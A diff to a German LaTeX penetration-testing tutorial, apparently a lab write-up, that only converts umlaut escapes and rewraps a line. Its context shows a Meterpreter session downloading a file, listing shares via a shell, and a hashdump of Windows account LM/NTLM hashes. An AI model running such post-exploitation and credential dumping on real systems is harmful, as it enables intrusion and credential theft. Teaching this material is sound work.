@@ -353,7 +353,7 @@ meterpreter > download Rezept2NJ.txt
 meterpreter > ;-)
 \end{lstlisting}
 
-Ein alternativer Weg, um in der Meterpreter-Session die Rezepte zu finden, geht über die Auflistung der vorhandenen Freigaben mit dem Windows-Befehl \emph{net use} in einer zuvor mit dem Befehl \emph{shell} ge\"offneten Windows-Kommandozeile. Daraus kann dann direkt der dahinterliegende Ordner gefunden und seine Inhalte aufgelistet werden... 
+Ein alternativer Weg, um in der Meterpreter-Session die Rezepte zu finden, geht über die Auflistung der vorhandenen Freigaben mit dem Windows-Befehl \emph{net use} in einer zuvor mit dem Befehl \emph{shell} geöffneten Windows-Kommandozeile. Daraus kann dann direkt der dahinterliegende Ordner gefunden und seine Inhalte aufgelistet werden... 
 
 \begin{lstlisting}[language=Metasploit]
 meterpreter > shell
@@ -373,7 +373,7 @@ IPC$    			Remote-IPC
 ADMIN$		C:\WINDOWS  	Remoteverwaltung
 C$  		C:\		Standardfreigabe
 Geheimrezepte  	C:\Geheimrezepte
-public		C:\public	\"Offentlicher Ordner
+public		C:\public	Öffentlicher Ordner
 
 Der Befehl wurde erfolgreich ausgefuhrt.
 
@@ -399,11 +399,12 @@ Marcel:1025:ed121d2a2b5ecee9c9e04f959d38ccb0:6ba8c72392ed275d6b9ffb1936f9bb6a:::
 Mayer:1028:aaf5ee32cbe91ffdaad3b435b51404ee:68b83446c10ded73a192fed4dbd4cd38:::
 Mueller:
 	1033:4ed51acf7905e9a9aad3b435b51404ee:56ed5326e548a66a2187da0d5810593b:::
-M\"uller:1034:fb0c033ca6248c12aad3b435b51404ee:6d175e66b077b534bc30280cb0218716:::
+Müller:1034:fb0c033ca6248c12aad3b435b51404ee:6d175e66b077b534bc30280cb0218716:::
 Rene:1026:b7731651af6345a825ad3b83fa6627c7:272da8d2ebae0086f417bce3790ce205:::
 SUPPORT_388945a0:
 	1001:aad3b435b51404eeaad3b435b51404ee:f949ba8fc7dd717fed514fc97e6025a8:::
-User0815:1023:e52cac67419a9a22417eaf50cfac29c3:60ed35ce39cf0db011f4bdbd19382d72:::
+User0815:
+	1023:e52cac67419a9a22417eaf50cfac29c3:60ed35ce39cf0db011f4bdbd19382d72:::
 \end{lstlisting}
 
 \subsubsection{Armitage}
